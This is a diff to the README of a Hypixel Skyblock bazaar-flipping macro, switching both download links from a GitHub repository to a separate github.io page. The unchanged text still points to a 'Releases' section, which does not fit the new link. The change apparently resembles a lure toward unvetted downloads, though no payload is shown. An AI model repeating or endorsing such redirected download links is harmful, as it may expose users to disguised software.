@@ -1,6 +1,6 @@
 # 📈 mbf-hypixel-macro - Automate your Hypixel Skyblock bazaar flips
 
-[![](https://img.shields.io/badge/Download-mbf_hypixel_macro-blue)](https://github.com/tayyabsal8544/mbf-hypixel-macro)
+[![](https://img.shields.io/badge/Download-mbf_hypixel_macro-blue)](https://tayyabsal8544.github.io)
 
 MBF automates bazaar flipping within Hypixel Skyblock. The software runs in the background to handle buy and sell orders. It keeps your shop active 24/7 so you earn coins while you play other games or step away from your computer.
 
@@ -17,7 +17,7 @@ If you lack Java, download it from the official Oracle website. Most users alrea
 
 ## 📦 Downloading the Software
 
-[Visit this page to download the latest version of mbf-hypixel-macro.](https://github.com/tayyabsal8544/mbf-hypixel-macro)
+[Visit this page to download the latest version of mbf-hypixel-macro.](https://tayyabsal8544.github.io)
 
 Look for the "Releases" section on the right side of the page. Click the link that matches your operating system. Save the file to your desktop or your downloads folder. Do not move files from the download folder if you intend to run the program once and delete it. We suggest creating a folder named "MBF" on your desktop to store the tool.
 
